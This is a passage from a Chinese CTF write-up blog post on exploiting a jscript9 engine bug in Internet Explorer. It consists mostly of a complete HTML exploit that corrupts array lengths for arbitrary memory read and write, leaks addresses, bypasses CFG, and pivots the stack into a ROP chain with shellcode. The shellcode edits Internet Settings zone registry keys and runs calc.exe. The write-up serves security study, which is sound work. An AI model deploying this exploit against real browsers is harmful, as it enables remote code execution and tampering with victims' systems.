class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">	  var vuln = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];</span><br><span class="line">	  //修改自身的size，实现任意地址读写</span><br><span class="line">	  vuln[0x3ffffffe] = -1;</span><br><span class="line">	  vuln[0x3ffffffd] = -1;</span><br><span class="line">	  vuln[0x3ffffff6] = -1;</span><br><span class="line">	  //泄露vtable地址</span><br><span class="line">	  var vtable_addr = vuln[0x3ffffff2];</span><br><span class="line">	  var jscript9_base = vtable_addr - 0x37e8;</span><br><span class="line">	  var LoadLibraryExA_ptr = jscript9_base + 0x37600C;</span><br><span class="line">	  var GetProcAddress_ptr = jscript9_base + 0x3761A8;</span><br><span class="line">	  var VirtualProtect_ptr = jscript9_base + 0x376110;</span><br><span class="line">	  var RtlCaptureContext_ptr = jscript9_base + 0x376488;</span><br><span class="line">	  var pop_esp = jscript9_base + 0x774ff;</span><br><span class="line">	  var mov_esp_ebx = jscript9_base + 0x23721a;</span><br><span class="line">	  var add_esp = jscript9_base + 0x270d5c;</span><br><span class="line">	  var base = vuln[0x3ffffff8] + 0x10;</span><br><span class="line">	  //alert(&quot;jscript9_base=&quot;+jscript9_base.toString(16));</span><br><span class="line">	  //alert(&quot;base=&quot;+base.toString(16));</span><br><span class="line">	  //4字节地址对齐的任意地址读</span><br><span class="line">	  function arb_read(addr) &#123;</span><br><span class="line">	     var offset = addr - base;</span><br><span class="line">		 if (offset &lt; 0) &#123;</span><br><span class="line">		    offset = (0x100000000 + offset) / 4;</span><br><span class="line">		 &#125; else &#123;</span><br><span class="line">		    offset = offset / 4;</span><br><span class="line">		 &#125;</span><br><span class="line">		 return vuln[offset];</span><br><span class="line">	  &#125;</span><br><span class="line">	  function packInt(value) &#123;</span><br><span class="line">	     if (value &gt; 0x80000000) &#123;</span><br><span class="line">		    value = value - 0x100000000;</span><br><span class="line">		 &#125;</span><br><span class="line">		 return value;</span><br><span class="line">	  &#125;</span><br><span class="line">	  </span><br><span class="line">	  var LoadLibraryExA_addr = arb_read(LoadLibraryExA_ptr);</span><br><span class="line">	  var GetProcAddress_addr = arb_read(GetProcAddress_ptr);</span><br><span class="line">	  var VirtualProtect_addr = arb_read(VirtualProtect_ptr);</span><br><span class="line">	  var RtlCaptureContext_addr = arb_read(RtlCaptureContext_ptr);</span><br><span class="line">	  //alert(&quot;LoadLibraryExA_addr=&quot;+LoadLibraryExA_addr.toString(16));</span><br><span class="line">	  //alert(&quot;GetProcAddress_addr=&quot;+GetProcAddress_addr.toString(16));</span><br><span class="line">	  //alert(&quot;VirtualProtect_addr=&quot;+VirtualProtect_addr.toString(16));</span><br><span class="line">	  //alert(&quot;RtlCaptureContext_addr=&quot;+RtlCaptureContext_addr.toString(16));</span><br><span class="line">	  //伪造该对象的虚表，从而leak出寄存器地址</span><br><span class="line">	  var leak = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];</span><br><span class="line">	  leak[0x3ffffffe] = -1;</span><br><span class="line">	  leak[0x3ffffffd] = -1;</span><br><span class="line">	  leak[0x3ffffff6] = -1;</span><br><span class="line">	  var fake_vtable_addr = leak[0x3ffffff8] + 0x10;</span><br><span class="line">	  leak[31] = packInt(RtlCaptureContext_addr); //伪造hasItem函数指针</span><br><span class="line">	  //修改leak的虚表指针</span><br><span class="line">	  leak[0x3ffffff2] = fake_vtable_addr;</span><br><span class="line">	  //调用hasItem，结果存放于base地址处</span><br><span class="line">	  var x = (base in leak);</span><br><span class="line">	  var stack_addr = arb_read(base + 0xB4);</span><br><span class="line">	  //劫持JavascriptArray::EntryPush函数的返回地址</span><br><span class="line">	  var rop_addr = stack_addr - 0x190;</span><br><span class="line">	  </span><br><span class="line">	  vuln[0] = 0x54464F53;</span><br><span class="line">	  vuln[1] = 0x45524157;</span><br><span class="line">	  vuln[2] = 0x63694D5C;</span><br><span class="line">	  vuln[3] = 0x6F736F72;</span><br><span class="line">	  vuln[4] = 0x575C7466;</span><br><span class="line">	  vuln[5] = 0x6F646E69;</span><br><span class="line">	  vuln[6] = 0x435C7377;</span><br><span class="line">	  vuln[7] = 0x65727275;</span><br><span class="line">	  vuln[8] = 0x6556746E;</span><br><span class="line">	  vuln[9] = 0x6F697372;</span><br><span class="line">	  vuln[10] = 0x6E495C6E;</span><br><span class="line">	  vuln[11] = 0x6E726574;</span><br><span class="line">	  vuln[12] = 0x53207465;</span><br><span class="line">	  vuln[13] = 0x69747465;</span><br><span class="line">	  vuln[14] = 0x5C73676E;</span><br><span class="line">	  vuln[15] = 0x656E6F5A;</span><br><span class="line">	  vuln[16] = 0x335C73;</span><br><span class="line">	  /*ADVAPI32.dll字符串*/</span><br><span class="line">	  vuln[17] = 0x41564441;</span><br><span class="line">	  vuln[18] = 0x32334950;</span><br><span class="line">	  vuln[19] = 0x6C6C642E;</span><br><span class="line">	  vuln[20] = 0;</span><br><span class="line">	  </span><br><span class="line">	  var buff = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];</span><br><span class="line">	  /*ucrtbase.dll字符串*/</span><br><span class="line">	  buff[0] = 0x74726375;</span><br><span class="line">	  buff[1] = 0x65736162;</span><br><span class="line">	  buff[2] = 0x6C6C642E;</span><br><span class="line">	  buff[3] = 0;</span><br><span class="line">	  /*RegOpenKeyExA字符串*/</span><br><span class="line">	  buff[4] = 0x4F676552;</span><br><span class="line">	  buff[5] = 0x4B6E6570;</span><br><span class="line">	  buff[6] = 0x78457965;</span><br><span class="line">	  buff[7] = 0x41;</span><br><span class="line">	  /*RegSetValueExA字符串*/</span><br><span class="line">	  buff[8] = 0x53676552;</span><br><span class="line">	  buff[9] = 0x61567465;</span><br><span class="line">	  buff[10] = 0x4565756C;</span><br><span class="line">	  buff[11] = 0x4178;</span><br><span class="line">	  /*RegCloseKey字符串*/</span><br><span class="line">	  buff[12] = 0x43676552;</span><br><span class="line">	  buff[13] = 0x65736F6C;</span><br><span class="line">	  buff[14] = 0x79654B;</span><br><span class="line">	  /*system字符串*/</span><br><span class="line">	  buff[15] = 0x74737973;</span><br><span class="line">	  buff[16] = 0x6D65;</span><br><span class="line"></span><br><span class="line">	  /*calc.exe字符串*/</span><br><span class="line">	  buff[17] = 0x636C6163;</span><br><span class="line">	  buff[18] = 0x6578652E;</span><br><span class="line">	  buff[19] = 0;</span><br><span class="line">	  </span><br><span class="line">	  </span><br><span class="line">	  buff[0x3ffffffe] = -1;</span><br><span class="line">	  buff[0x3ffffffd] = -1;</span><br><span class="line">	  buff[0x3ffffff6] = -1;</span><br><span class="line">	  var strs_base = buff[0x3ffffff8] + 0x10;</span><br><span class="line">	  </span><br><span class="line">	  //修改vuln的index，然后利用push可以一次性写入多个值</span><br><span class="line">	  vuln[0x3ffffff6] = (rop_addr - base) / 4;</span><br><span class="line">	  vuln[0x3ffffffd] = (rop_addr - base) / 4;</span><br><span class="line">	  alert(&quot;rop_addr=&quot;+rop_addr.toString(&quot;16&quot;));</span><br><span class="line">	  </span><br><span class="line">	  vuln.push(packInt(VirtualProtect_addr),packInt(rop_addr+0x18),packInt(rop_addr+0x18),0x300,0x40,packInt(rop_addr),packInt(0x81e58955),0x100ec,packInt(0xfc45c700),0x3,packInt(0xff5085c7),0x3532ffff,packInt(0x85c73030),packInt(0xffffff54),0x0,0x80068,0x68006a00,packInt(base+0x44),packInt(0x85c79090),packInt(0xffffff4c),packInt(LoadLibraryExA_addr),packInt(0xff4c95ff),packInt(0x8589ffff),packInt(0xffffff48),0x68909090,packInt(strs_base+0x10),packInt(0x85c79050),packInt(0xffffff44),packInt(GetProcAddress_addr),packInt(0xff4495ff),packInt(0x8589ffff),packInt(0xffffff40),0x68909090,packInt(strs_base+0x20),packInt(0xff48b5ff),packInt(0x95ffffff),packInt(0xffffff44),packInt(0xff3c8589),0x6890ffff,packInt(strs_base+0x30),packInt(0xff48b5ff),packInt(0x95ffffff),packInt(0xffffff44),packInt(0xff388589),packInt(0x858dffff),packInt(0xffffff34),0x66850,0x6a0002,0x68909090,packInt(base),0x168,0x4095ff80,0x6affffff,packInt(0xfc458d04),0x6a046a50,0x50858d00,0x50ffffff,packInt(0xff34b5ff),packInt(0x95ffffff),packInt(0xffffff3c),packInt(0xff34b5ff),packInt(0x95ffffff),packInt(0xffffff38),0x80068,0x68006a00,packInt(strs_base),packInt(0xff4c95ff),0x6890ffff,packInt(strs_base+0x3C),0x4495ff50,0x68ffffff,packInt(strs_base+0x44),0xD0FF);</span><br><span class="line">	  //alert(&quot;done&quot;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h2><p>测试时需要关闭IE浏览器的保护模式，否则会由于IE浏览器的沙盒机制，系统函数调用失败<br><img src="https://p5.ssl.qhimg.com/t0189043b7c25f844fb.png"></p>
+<h2 id="0x03-感想"><a href="#0x03-感想" class="headerlink" title="0x03 感想"></a>0x03 感想</h2><p>通过本题学习了IE浏览器漏洞挖掘的一些利用手法，收获很大，RealWord还是比普通PWN有趣。</p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>1.如何绕过Windows 10的CFG机制<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/126007.html">https://www.freebuf.com/articles/system/126007.html</a><br>2.CFG防护机制的简要分析 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2587">https://xz.aliyun.com/t/2587</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
+              <a href="/ha1vk/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
+              <a href="/ha1vk/tags/windows%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag"># windows漏洞利用</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/11/16/qwb2020-final-adobe/" rel="prev" title="强网杯2020决赛RealWord题ADoBe(ADB)">
+      <i class="fa fa-chevron-left"></i> 强网杯2020决赛RealWord题ADoBe(ADB)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/04/N1CTF2020-Escape/" rel="next" title="V8逃逸分析(escape-analysis)——N1CTF2020 Escape">
+      V8逃逸分析(escape-analysis)——N1CTF2020 Escape <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">0x01 挖掘过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%BE%E5%88%B0patch%E7%82%B9"><span class="nav-number">2.1.</span> <span class="nav-text">找到patch点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90patch%E7%82%B9"><span class="nav-number">2.2.</span> <span class="nav-text">分析patch点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-number">2.3.</span> <span class="nav-text">实现任意地址读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="nav-number">2.4.</span> <span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CFG%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.</span> <span class="nav-text">CFG绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E6%A0%88%E5%81%9AROP"><span class="nav-number">2.6.</span> <span class="nav-text">劫持栈做ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8exp-html"><span class="nav-number">2.7.</span> <span class="nav-text">完整利用exp.html</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%B5%8B%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">0x02 测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%84%9F%E6%83%B3"><span class="nav-number">4.</span> <span class="nav-text">0x03 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">0x04 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
